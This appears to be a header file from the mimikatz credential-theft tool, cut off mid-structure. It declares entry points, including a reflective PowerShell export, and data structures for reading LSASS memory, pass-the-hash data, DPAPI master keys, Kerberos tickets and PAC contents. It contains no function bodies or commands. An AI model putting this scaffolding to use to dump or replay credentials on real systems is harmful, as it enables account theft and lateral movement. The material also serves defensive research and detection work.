



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"
#include <fltUser.h>
#include <sql.h>
#pragma warning(push)
#pragma warning(disable:4201)
#include <sqlext.h>
#pragma warning(pop)
#include <sqltypes.h>


#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>
#include <cardmod.h>
#include <WinDNS.h>
#include <time.h>
#include <wbemidl.h>
#include <rpc.h>
#include <rpcndr.h>
#include <string.h>
#include <Winldap.h>
#include <Winber.h>
#include <msasn1.h>
#include <strsafe.h>
#include <fci.h>
#include <shlwapi.h>
#include <pshpack4.h>
#include <poppack.h>

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
#include <pshpack8.h>   // Assume 8-byte (64-bit) packing throughout
#elif defined(_M_IX86)
#include <pshpack1.h>   // Assume byte packing throughout (32-bit processor)
#endif
#include <poppack.h>
#include <winioctl.h>
#include <Winldap.h>
#include <WinBer.h>
#include <dbghelp.h>
#include <DsGetDC.h>
#include <io.h>
#include <fcntl.h>
#include <userenv.h>
#include <aclapi.h>
#include <sddl.h>
#include <msxml2.h>
//#include "modules/kuhl_m_standard.h"
//#include "modules/kuhl_m_crypto.h"
//#include "modules/sekurlsa/kuhl_m_sekurlsa.h"
//#include "modules/kerberos/kuhl_m_kerberos.h"
//#include "modules/ngc/kuhl_m_ngc.h"
//#include "modules/kuhl_m_process.h"
//#include "modules/kuhl_m_service.h"
//#include "modules/kuhl_m_privilege.h"
//#include "modules/kuhl_m_lsadump.h"
//#include "modules/kuhl_m_ts.h"
//#include "modules/kuhl_m_event.h"
//#include "modules/kuhl_m_misc.h"
//#include "modules/kuhl_m_token.h"
//#include "modules/kuhl_m_vault.h"
//#include "modules/kuhl_m_minesweeper.h"
#if defined(NET_MODULE)
//#include "modules/kuhl_m_net.h"
#endif
//#include "modules/dpapi/kuhl_m_dpapi.h"
//#include "modules/kuhl_m_kernel.h"
//#include "modules/kuhl_m_busylight.h"
//#include "modules/kuhl_m_sysenvvalue.h"
//#include "modules/kuhl_m_sid.h"
//#include "modules/kuhl_m_iis.h"
//#include "modules/kuhl_m_rpc.h"
//#include "modules/kuhl_m_sr98.h"
//#include "modules/kuhl_m_rdm.h"
//#include "modules/kuhl_m_acr.h"


extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void mimikatz_begin();
void mimikatz_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS mimikatz_initOrClean(BOOL Init);

NTSTATUS mimikatz_doLocal(wchar_t * input);
NTSTATUS mimikatz_dispatchCommand(wchar_t * input);

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=mimikatz_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_mimikatz_dll@16")
#endif
#endif

////////////////////////////////////////////////////////////////////

#define	MD4_DIGEST_LENGTH	16
#define	MD5_DIGEST_LENGTH	16
#define SHA_DIGEST_LENGTH	20

#define	DES_KEY_LENGTH		7
#define DES_BLOCK_LENGTH	8
#define AES_128_KEY_LENGTH	16
#define AES_256_KEY_LENGTH	32

#if !defined(IPSEC_FLAG_CHECK)
#define IPSEC_FLAG_CHECK 0xf42a19b6
#endif


#define CALG_CRC32	(ALG_CLASS_HASH | ALG_TYPE_ANY | 0)

#define AES_256_KEY_SIZE	(256/8)
#define AES_128_KEY_SIZE	(128/8)
#define AES_BLOCK_SIZE		16

typedef NTSTATUS(*PKUHL_M_C_FUNC) (int argc, wchar_t* args[]);
typedef NTSTATUS(*PKUHL_M_C_FUNC_INIT) ();

typedef struct _GENERICKEY_BLOB {
	BLOBHEADER Header;
	DWORD dwKeyLen;
} GENERICKEY_BLOB, * PGENERICKEY_BLOB;

typedef struct _RSA_GENERICKEY_BLOB {
	BLOBHEADER Header;
	RSAPUBKEY RsaKey; // works with RSA2 ;)
} RSA_GENERICKEY_BLOB, * PRSA_GENERICKEY_BLOB;

typedef struct _DSS_GENERICKEY_BLOB {
	BLOBHEADER Header;
	DSSPUBKEY DsaKey; // works with DSS2 ;)
} DSS_GENERICKEY_BLOB, * PDSS_GENERICKEY_BLOB;

typedef struct _DSS_GENERICKEY3_BLOB {
	BLOBHEADER Header;
	DSSPRIVKEY_VER3 DsaKey; // works with DSS4 (but not DSS3) ;)
} DSS_GENERICKEY3_BLOB, * PDSS_GENERICKEY3_BLOB;

#define PVK_FILE_VERSION_0				0
#define PVK_MAGIC						0xb0b5f11e // bob's file
#define PVK_NO_ENCRYPT					0
#define PVK_RC4_PASSWORD_ENCRYPT		1
#define PVK_RC2_CBC_PASSWORD_ENCRYPT	2



typedef wchar_t* CLAIM_ID;
typedef wchar_t** PCLAIM_ID;

#define NDR_TSI_20 { {0x8a885d04, 0x1ceb, 0x11c9, { 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60 }}, { 2, 0 }}

typedef DWORD NET_API_STATUS;
typedef UNICODE_STRING RPC_UNICODE_STRING;


typedef enum _CLAIM_TYPE {
	CLAIM_TYPE_INT64 = 1,
	CLAIM_TYPE_UINT64 = 2,
	CLAIM_TYPE_STRING = 3,
	CLAIM_TYPE_BOOLEAN = 6
} CLAIM_TYPE, * PCLAIM_TYPE;

typedef enum _CLAIMS_SOURCE_TYPE {
	CLAIMS_SOURCE_TYPE_AD = 1,
	CLAIMS_SOURCE_TYPE_CERTIFICATE = (CLAIMS_SOURCE_TYPE_AD + 1)
} CLAIMS_SOURCE_TYPE;

typedef enum _CLAIMS_COMPRESSION_FORMAT {
	CLAIMS_COMPRESSION_FORMAT_NONE = 0,
	CLAIMS_COMPRESSION_FORMAT_LZNT1 = 2,
	CLAIMS_COMPRESSION_FORMAT_XPRESS = 3,
	CLAIMS_COMPRESSION_FORMAT_XPRESS_HUFF = 4
} CLAIMS_COMPRESSION_FORMAT;

typedef struct _CLAIM_ENTRY {
	CLAIM_ID Id;
	CLAIM_TYPE Type;
	union
	{
		struct _ci64
		{
			ULONG ValueCount;
			LONG64* Int64Values;
		} 	ci64;
		struct _cui64
		{
			ULONG ValueCount;
			ULONG64* Uint64Values;
		} 	cui64;
		struct _cs
		{
			ULONG ValueCount;
			LPWSTR* StringValues;
		} 	cs;
		struct _cb
		{
			ULONG ValueCount;
			ULONG64* BooleanValues;
		} 	cb;
	} 	Values;
} CLAIM_ENTRY, * PCLAIM_ENTRY;

void* _ReturnAddress(void);
//#pragma intrinsic(_ReturnAddress)

typedef enum _KULL_M_MEMORY_TYPE
{
	KULL_M_MEMORY_TYPE_OWN,
	KULL_M_MEMORY_TYPE_PROCESS,
	KULL_M_MEMORY_TYPE_PROCESS_DMP,
	KULL_M_MEMORY_TYPE_KERNEL,
	KULL_M_MEMORY_TYPE_KERNEL_DMP,
	KULL_M_MEMORY_TYPE_HYBERFILE,
	KULL_M_MEMORY_TYPE_FILE,
} KULL_M_MEMORY_TYPE;


typedef struct _KULL_M_MINIDUMP_HANDLE {
	HANDLE hFileMapping;
	LPVOID pMapViewOfFile;
} KULL_M_MINIDUMP_HANDLE, * PKULL_M_MINIDUMP_HANDLE;

typedef struct _KULL_M_MEMORY_HANDLE_PROCESS
{
	HANDLE hProcess;
} KULL_M_MEMORY_HANDLE_PROCESS, * PKULL_M_MEMORY_HANDLE_PROCESS;

typedef struct _KULL_M_MEMORY_HANDLE_FILE
{
	HANDLE hFile;
} KULL_M_MEMORY_HANDLE_FILE, * PKULL_M_MEMORY_HANDLE_FILE;

typedef struct _KULL_M_MEMORY_HANDLE_PROCESS_DMP
{
	PKULL_M_MINIDUMP_HANDLE hMinidump;
} KULL_M_MEMORY_HANDLE_PROCESS_DMP, * PKULL_M_MEMORY_HANDLE_PROCESS_DMP;

typedef struct _KULL_M_MEMORY_HANDLE_KERNEL
{
	HANDLE hDriver;
} KULL_M_MEMORY_HANDLE_KERNEL, * PKULL_M_MEMORY_HANDLE_KERNEL;

typedef struct _KULL_M_MEMORY_HANDLE {
	KULL_M_MEMORY_TYPE type;
	union {
		PKULL_M_MEMORY_HANDLE_PROCESS pHandleProcess;
		PKULL_M_MEMORY_HANDLE_FILE pHandleFile;
		PKULL_M_MEMORY_HANDLE_PROCESS_DMP pHandleProcessDmp;
		PKULL_M_MEMORY_HANDLE_KERNEL pHandleDriver;
	};
} KULL_M_MEMORY_HANDLE, * PKULL_M_MEMORY_HANDLE;
KULL_M_MEMORY_HANDLE KULL_M_MEMORY_GLOBAL_OWN_HANDLE;

typedef struct _KULL_M_MEMORY_ADDRESS {
	LPVOID address;
	PKULL_M_MEMORY_HANDLE hMemory;
} KULL_M_MEMORY_ADDRESS, * PKULL_M_MEMORY_ADDRESS;

typedef struct _KULL_M_MEMORY_RANGE {
	KULL_M_MEMORY_ADDRESS kull_m_memoryAdress;
	SIZE_T size;
} KULL_M_MEMORY_RANGE, * PKULL_M_MEMORY_RANGE;

typedef struct _KULL_M_MEMORY_SEARCH {
	KULL_M_MEMORY_RANGE kull_m_memoryRange;
	LPVOID result;
} KULL_M_MEMORY_SEARCH, * PKULL_M_MEMORY_SEARCH;


typedef struct _KIWI_DATETIME_FORMATS {
	LPCWSTR format;
	int minFields;
	BYTE idxYear;
	BYTE idxMonth;
	BYTE idxDay;
	BYTE idxHour;
	BYTE idxMinute;
	BYTE idxSecond;
} KIWI_DATETIME_FORMATS, * PKIWI_DATETIME_FORMATS;

typedef CONST char* PCSZ;
typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;
typedef CONST UNICODE_STRING* PCUNICODE_STRING;


typedef struct _KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION {
	KULL_M_MEMORY_ADDRESS DllBase;
	ULONG SizeOfImage;
	ULONG TimeDateStamp;
	PCUNICODE_STRING NameDontUseOutsideCallback;
} KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION, * PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;

typedef struct _KULL_M_PROCESS_PID_FOR_NAME {
	PCUNICODE_STRING	name;
	PDWORD				processId;
	BOOL				isFound;
} KULL_M_PROCESS_PID_FOR_NAME, * PKULL_M_PROCESS_PID_FOR_NAME;

typedef struct _KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION_FOR_NAME {
	PCUNICODE_STRING	name;
	PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION	informations;
	BOOL				isFound;
} KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION_FOR_NAME, * PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION_FOR_NAME;


typedef struct _CLAIMS_ARRAY {
	CLAIMS_SOURCE_TYPE usClaimsSourceType;
	ULONG ulClaimsCount;
	PCLAIM_ENTRY ClaimEntries;
} CLAIMS_ARRAY, * PCLAIMS_ARRAY;

typedef struct _CLAIMS_SET {
	ULONG ulClaimsArrayCount;
	PCLAIMS_ARRAY ClaimsArrays;
	USHORT usReservedType;
	ULONG ulReservedFieldSize;
	BYTE* ReservedField;
} CLAIMS_SET, * PCLAIMS_SET;

typedef struct _CLAIMS_SET_METADATA {
	ULONG ulClaimsSetSize;
	BYTE* ClaimsSet;
	CLAIMS_COMPRESSION_FORMAT usCompressionFormat;
	ULONG ulUncompressedClaimsSetSize;
	USHORT usReservedType;
	ULONG ulReservedFieldSize;
	BYTE* ReservedField;
} CLAIMS_SET_METADATA, * PCLAIMS_SET_METADATA;

typedef struct _RTL_BALANCED_LINKS {
	struct _RTL_BALANCED_LINKS* Parent;
	struct _RTL_BALANCED_LINKS* LeftChild;
	struct _RTL_BALANCED_LINKS* RightChild;
	CHAR Balance;
	UCHAR Reserved[3]; // align
} RTL_BALANCED_LINKS, * PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
	RTL_BALANCED_LINKS BalancedRoot;
	PVOID OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	ULONG DepthOfTree;
	PRTL_BALANCED_LINKS RestartKey;
	ULONG DeleteCount;
	PVOID CompareRoutine; //
	PVOID AllocateRoutine; //
	PVOID FreeRoutine; //
	PVOID TableContext;
} RTL_AVL_TABLE, * PRTL_AVL_TABLE;

typedef struct _KIWI_GENERIC_PRIMARY_CREDENTIAL {
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	LSA_UNICODE_STRING Password;
} KIWI_GENERIC_PRIMARY_CREDENTIAL, * PKIWI_GENERIC_PRIMARY_CREDENTIAL;

typedef struct _KUHL_M_SEKURLSA_LIB {
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION Informations;
	BOOL isPresent;
	BOOL isInit;
} KUHL_M_SEKURLSA_LIB, * PKUHL_M_SEKURLSA_LIB;

typedef struct _KUHL_M_SEKURLSA_OS_CONTEXT {
	DWORD MajorVersion;
	DWORD MinorVersion;
	DWORD BuildNumber;
} KUHL_M_SEKURLSA_OS_CONTEXT, * PKUHL_M_SEKURLSA_OS_CONTEXT;

typedef struct _KUHL_M_SEKURLSA_CONTEXT {
	PKULL_M_MEMORY_HANDLE hLsassMem;
	KUHL_M_SEKURLSA_OS_CONTEXT osContext;
} KUHL_M_SEKURLSA_CONTEXT, * PKUHL_M_SEKURLSA_CONTEXT;

typedef NTSTATUS(*PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS) (PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
typedef NTSTATUS(*PKUHL_M_SEKURLSA_INIT) ();

typedef struct _KUHL_M_SEKURLSA_LOCAL_HELPER {
	PKUHL_M_SEKURLSA_INIT initLocalLib;
	PKUHL_M_SEKURLSA_INIT cleanLocalLib;
	PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS AcquireKeys;
	const PLSA_PROTECT_MEMORY* pLsaProtectMemory;
	const PLSA_PROTECT_MEMORY* pLsaUnprotectMemory;
} KUHL_M_SEKURLSA_LOCAL_HELPER, * PKUHL_M_SEKURLSA_LOCAL_HELPER;

typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
	PKUHL_M_SEKURLSA_CONTEXT	cLsass;
	const KUHL_M_SEKURLSA_LOCAL_HELPER* lsassLocalHelper;
	PLUID						LogonId;
	PLSA_UNICODE_STRING			UserName;
	PLSA_UNICODE_STRING			LogonDomain;
	ULONG						LogonType;
	ULONG						Session;
	PVOID						pCredentials;
	PSID						pSid;
	PVOID						pCredentialManager;
	FILETIME					LogonTime;
	PLSA_UNICODE_STRING			LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, * PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;

typedef void (CALLBACK* PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef void (CALLBACK* PKUHL_M_SEKURLSA_ENUM_LOGONDATA) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
typedef BOOL(CALLBACK* PKUHL_M_SEKURLSA_ENUM) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KUHL_M_SEKURLSA_PACKAGE {
	const wchar_t* Name;
	PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;
	BOOL isValid;
	const wchar_t* ModuleName;
	KUHL_M_SEKURLSA_LIB Module;
} KUHL_M_SEKURLSA_PACKAGE, * PKUHL_M_SEKURLSA_PACKAGE;

typedef struct _SEKURLSA_PTH_DATA {
	PLUID		LogonId;
	LPBYTE		NtlmHash;
	LPBYTE		Aes256Key;
	LPBYTE		Aes128Key;
	BOOL		isReplaceOk;
} SEKURLSA_PTH_DATA, * PSEKURLSA_PTH_DATA;


typedef struct _PVK_FILE_HDR {
	DWORD	dwMagic;
	DWORD	dwVersion;
	DWORD	dwKeySpec;
	DWORD	dwEncryptType;
	DWORD	cbEncryptData;
	DWORD	cbPvk;
} PVK_FILE_HDR, * PPVK_FILE_HDR;

typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[ANYSIZE_ARRAY]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;

typedef struct _KIWI_BCRYPT_KEY {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG bits;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, * PKIWI_BCRYPT_KEY;



typedef struct _KULL_M_DPAPI_CREDHIST_HEADER {
	DWORD	dwVersion;
	GUID	guid;
	DWORD	dwNextLen;
} KULL_M_DPAPI_CREDHIST_HEADER, * PKULL_M_DPAPI_CREDHIST_HEADER;

typedef struct _KULL_M_DPAPI_CREDHIST_ENTRY {
	KULL_M_DPAPI_CREDHIST_HEADER	header;
	DWORD	dwType; // flags ?
	ALG_ID	algHash;
	DWORD	rounds;
	DWORD	sidLen;
	ALG_ID	algCrypt;
	DWORD	sha1Len;
	DWORD	md4Len;
	BYTE	salt[16];

	PSID	pSid;
	PBYTE	pSecret;

	DWORD	__dwSecretLen;
} KULL_M_DPAPI_CREDHIST_ENTRY, * PKULL_M_DPAPI_CREDHIST_ENTRY;


typedef struct _KUHL_M_DPAPI_MASTERKEY_ENTRY {
	GUID guid;
	BYTE keyHash[SHA_DIGEST_LENGTH];
	DWORD keyLen;
	BYTE* key;
} KUHL_M_DPAPI_MASTERKEY_ENTRY, * PKUHL_M_DPAPI_MASTERKEY_ENTRY;


typedef struct _KUHL_M_DPAPI_CREDENTIAL_ENTRY {
	DWORD flags;
	GUID guid;
	WCHAR* sid;
	BYTE md4hash[LM_NTLM_HASH_LENGTH];
	BYTE md4hashDerived[SHA_DIGEST_LENGTH];
	BYTE sha1hash[SHA_DIGEST_LENGTH];
	BYTE sha1hashDerived[SHA_DIGEST_LENGTH];
	BYTE md4protectedhash[LM_NTLM_HASH_LENGTH];
	BYTE md4protectedhashDerived[SHA_DIGEST_LENGTH];
} KUHL_M_DPAPI_CREDENTIAL_ENTRY, * PKUHL_M_DPAPI_CREDENTIAL_ENTRY;

typedef struct _KUHL_M_DPAPI_DOMAINKEY_ENTRY {
	GUID guid;
	BOOL isNewKey;
	DWORD keyLen;
	BYTE* key;
} KUHL_M_DPAPI_DOMAINKEY_ENTRY, * PKUHL_M_DPAPI_DOMAINKEY_ENTRY;


//typedef struct _KERB_EXTERNAL_NAME123 {
//    SHORT NameType;
//    USHORT NameCount;
//    UNICODE_STRING Names[ANYSIZE_ARRAY];
//} KERB_EXTERNAL_NAME, *PKERB_EXTERNAL_NAME;


//typedef struct _KERB_EXTERNAL_TICKET {
//    PKERB_EXTERNAL_NAME ServiceName;
//    PKERB_EXTERNAL_NAME TargetName;
//    PKERB_EXTERNAL_NAME ClientName;
//    UNICODE_STRING DomainName;
//    UNICODE_STRING TargetDomainName;
//    UNICODE_STRING AltTargetDomainName;  // contains ClientDomainName
//    KERB_CRYPTO_KEY SessionKey;
//    ULONG TicketFlags;
//    ULONG Flags;
//    LARGE_INTEGER KeyExpirationTime;
//    LARGE_INTEGER StartTime;
//    LARGE_INTEGER EndTime;
//    LARGE_INTEGER RenewUntil;
//    LARGE_INTEGER TimeSkew;
//    ULONG EncodedTicketSize;
//    PUCHAR EncodedTicket;
//} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;

//typedef struct _KERB_RETRIEVE_TKT_REQUEST {
//    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
//    LUID LogonId;
//    UNICODE_STRING TargetName;
//    ULONG TicketFlags;
//    ULONG CacheOptions;
//    LONG EncryptionType;
//    SecHandle CredentialsHandle;
//} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
//
//typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
//    KERB_EXTERNAL_TICKET Ticket;
//} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;




#define ID_APP_TICKET								1
#define ID_CTX_TICKET_TKT_VNO						0
#define ID_CTX_TICKET_REALM							1
#define ID_CTX_TICKET_SNAME							2
#define ID_CTX_TICKET_ENC_PART						3

#define ID_APP_ENCTICKETPART						3
#define ID_CTX_ENCTICKETPART_FLAGS					0
#define ID_CTX_ENCTICKETPART_KEY					1
#define ID_CTX_ENCTICKETPART_CREALM					2
#define ID_CTX_ENCTICKETPART_CNAME					3
#define ID_CTX_ENCTICKETPART_TRANSITED				4
#define ID_CTX_ENCTICKETPART_AUTHTIME				5
#define ID_CTX_ENCTICKETPART_STARTTIME				6
#define ID_CTX_ENCTICKETPART_ENDTIME				7
#define ID_CTX_ENCTICKETPART_RENEW_TILL				8
#define ID_CTX_ENCTICKETPART_CADDR					9
#define ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA		10

#define ID_APP_KRB_CRED								22
#define ID_CTX_KRB_CRED_PVNO						0
#define ID_CTX_KRB_CRED_MSG_TYPE					1
#define ID_CTX_KRB_CRED_TICKETS						2
#define ID_CTX_KRB_CRED_ENC_PART					3

#define ID_APP_ENCKRBCREDPART						29
#define ID_CTX_ENCKRBCREDPART_TICKET_INFO			0
#define ID_CTX_ENCKRBCREDPART_NONCE					1
#define ID_CTX_ENCKRBCREDPART_TIMESTAMP				2
#define ID_CTX_ENCKRBCREDPART_USEC					3
#define ID_CTX_ENCKRBCREDPART_S_ADDRESS				4
#define ID_CTX_ENCKRBCREDPART_R_ADDRESS				5

#define ID_CTX_KRBCREDINFO_KEY						0
#define ID_CTX_KRBCREDINFO_PREALM					1
#define ID_CTX_KRBCREDINFO_PNAME					2
#define ID_CTX_KRBCREDINFO_FLAGS					3
#define ID_CTX_KRBCREDINFO_AUTHTIME					4
#define ID_CTX_KRBCREDINFO_STARTTIME				5
#define ID_CTX_KRBCREDINFO_ENDTIME					6
#define ID_CTX_KRBCREDINFO_RENEW_TILL				7
#define ID_CTX_KRBCREDINFO_SREAL					8
#define ID_CTX_KRBCREDINFO_SNAME					9
#define ID_CTX_KRBCREDINFO_CADDR					10

#define ID_CTX_PRINCIPALNAME_NAME_TYPE				0
#define ID_CTX_PRINCIPALNAME_NAME_STRING			1

#define ID_CTX_ENCRYPTIONKEY_KEYTYPE				0
#define ID_CTX_ENCRYPTIONKEY_KEYVALUE				1

#define ID_CTX_ENCRYPTEDDATA_ETYPE					0
#define ID_CTX_ENCRYPTEDDATA_KVNO					1
#define ID_CTX_ENCRYPTEDDATA_CIPHER					2

#define ID_CTX_TRANSITEDENCODING_TR_TYPE			0
#define ID_CTX_TRANSITEDENCODING_CONTENTS			1

#define ID_CTX_AUTHORIZATIONDATA_AD_TYPE			0
#define ID_CTX_AUTHORIZATIONDATA_AD_DATA			1

#define ID_AUTHDATA_AD_IF_RELEVANT					1
#define ID_AUTHDATA_AD_WIN2K_PAC					128

typedef struct _KIWI_KERBEROS_BUFFER {
	ULONG Length;
	PUCHAR Value;
} KIWI_KERBEROS_BUFFER, * PKIWI_KERBEROS_BUFFER;

typedef struct _KIWI_KERBEROS_TICKET {
	PKERB_EXTERNAL_NAME	ServiceName;
	LSA_UNICODE_STRING	DomainName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	TargetDomainName;
	PKERB_EXTERNAL_NAME	ClientName;
	LSA_UNICODE_STRING	AltTargetDomainName;

	LSA_UNICODE_STRING	Description;

	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;

	LONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;

	ULONG		TicketFlags;
	LONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_TICKET, * PKIWI_KERBEROS_TICKET;



typedef PVOID	SAMPR_HANDLE;

typedef enum _USER_INFORMATION_CLASS {
	UserSetPasswordInformation = 15,
	UserInternal1Information = 18,
	UserAllInformation = 21,
} USER_INFORMATION_CLASS, * PUSER_INFORMATION_CLASS;

typedef struct _SAMPR_SR_SECURITY_DESCRIPTOR {
	DWORD Length;
	PUCHAR SecurityDescriptor;
} SAMPR_SR_SECURITY_DESCRIPTOR, * PSAMPR_SR_SECURITY_DESCRIPTOR;

typedef struct _GROUP_MEMBERSHIP {
	DWORD RelativeId;
	DWORD Attributes;
} GROUP_MEMBERSHIP, * PGROUP_MEMBERSHIP;

#define PACINFO_TYPE_LOGON_INFO				0x00000001
#define PACINFO_TYPE_CREDENTIALS_INFO		0x00000002
#define PACINFO_TYPE_CHECKSUM_SRV			0x00000006
#define PACINFO_TYPE_CHECKSUM_KDC			0x00000007
#define PACINFO_TYPE_CNAME_TINFO			0x0000000a
#define PACINFO_TYPE_DELEGATION_INFO		0x0000000b
#define PACINFO_TYPE_UPN_DNS				0x0000000c
#define PACINFO_TYPE_CLIENT_CLAIMS			0x0000000d
#define PACINFO_TYPE_DEVICE_INFO			0x0000000e
#define PACINFO_TYPE_DEVICE_CLAIMS			0x0000000f

typedef struct _PAC_INFO_BUFFER {
	ULONG ulType;
	ULONG cbBufferSize;
	ULONG64 Offset;
} PAC_INFO_BUFFER, * PPAC_INFO_BUFFER;

typedef struct _PACTYPE {
	ULONG cBuffers;
	ULONG Version;
	PAC_INFO_BUFFER Buffers[ANYSIZE_ARRAY];
} PACTYPE, * PPACTYPE;

typedef struct _PAC_CLIENT_INFO {
	FILETIME ClientId;
	USHORT NameLength;
	WCHAR Name[ANYSIZE_ARRAY];
} PAC_CLIENT_INFO, * PPAC_CLIENT_INFO;

typedef struct _PAC_CREDENTIAL_INFO {
	ULONG Version;
	ULONG EncryptionType;
	UCHAR SerializedData[ANYSIZE_ARRAY];
} PAC_CREDENTIAL_INFO, * PPAC_CREDENTIAL_INFO;

#if !defined(_NTSECPKG_)
typedef struct _SECPKG_SUPPLEMENTAL_CRED {
	RPC_UNICODE_STRING PackageName;
	ULONG CredentialSize;
	PUCHAR Credentials;
} SECPKG_SUPPLEMENTAL_CRED, * PSECPKG_SUPPLEMENTAL_CRED;
#endif

typedef struct _PAC_CREDENTIAL_DATA {
	ULONG CredentialCount;
	SECPKG_SUPPLEMENTAL_CRED Credentials[ANYSIZE_ARRAY];
} PAC_CREDENTIAL_DATA, * PPAC_CREDENTIAL_DATA;

typedef struct _NTLM_SUPPLEMENTAL_CREDENTIAL {
	ULONG Version;
	ULONG Flags;
	UCHAR LmPassword[LM_NTLM_HASH_LENGTH];
	UCHAR NtPassword[LM_NTLM_HASH_LENGTH];
} NTLM_SUPPLEMENTAL_CREDENTIAL, * PNTLM_SUPPLEMENTAL_CREDENTIAL;

typedef struct _UPN_DNS_INFO {
	USHORT UpnLength;
	USHORT UpnOffset;
	USHORT DnsDomainNameLength;
	USHORT DnsDomainNameOffset;
	ULONG Flags;
} UPN_DNS_INFO, * PUPN_DNS_INFO;

typedef struct _S4U_DELEGATION_INFO {
	RPC_UNICODE_STRING S4U2proxyTarget;
	ULONG TransitedListSize;
	RPC_UNICODE_STRING S4UTransitedServices[ANYSIZE_ARRAY];
} S4U_DELEGATION_INFO, * PS4U_DELEGATION_INFO;

typedef struct _KERB_SID_AND_ATTRIBUTES {
	PISID Sid;
	ULONG Attributes;
} KERB_SID_AND_ATTRIBUTES, * PKERB_SID_AND_ATTRIBUTES;

typedef struct _CYPHER_BLOCK {
	CHAR data[8];
} CYPHER_BLOCK, * PCYPHER_BLOCK;

typedef struct _NT_OWF_PASSWORD {
	CYPHER_BLOCK data[2];
} NT_OWF_PASSWORD, * PNT_OWF_PASSWORD, ENCRYPTED_NT_OWF_PASSWORD, * PENCRYPTED_NT_OWF_PASSWORD, USER_SESSION_KEY;

typedef struct _KERB_VALIDATION_INFO {
	FILETIME LogonTime;
	FILETIME LogoffTime;
	FILETIME KickOffTime;
	FILETIME PasswordLastSet;
	FILETIME PasswordCanChange;
	FILETIME PasswordMustChange;
	RPC_UNICODE_STRING EffectiveName;
	RPC_UNICODE_STRING FullName;
	RPC_UNICODE_STRING LogonScript;
	RPC_UNICODE_STRING ProfilePath;
	RPC_UNICODE_STRING HomeDirectory;
	RPC_UNICODE_STRING HomeDirectoryDrive;
	USHORT LogonCount;
	USHORT BadPasswordCount;
	ULONG UserId;
	ULONG PrimaryGroupId;
	ULONG GroupCount;
	/* [size_is] */ PGROUP_MEMBERSHIP GroupIds;
	ULONG UserFlags;
	USER_SESSION_KEY UserSessionKey;
	RPC_UNICODE_STRING LogonServer;
	RPC_UNICODE_STRING LogonDomainName;
	PISID LogonDomainId;
	ULONG Reserved1[2];
	ULONG UserAccountControl;
	ULONG SubAuthStatus;
	FILETIME LastSuccessfulILogon;
	FILETIME LastFailedILogon;
	ULONG FailedILogonCount;
	ULONG Reserved3;
	ULONG SidCount;
	/* [size_is] */ PKERB_SID_AND_ATTRIBUTES ExtraSids;
	PISID ResourceGroupDomainSid;
	ULONG ResourceGroupCount;
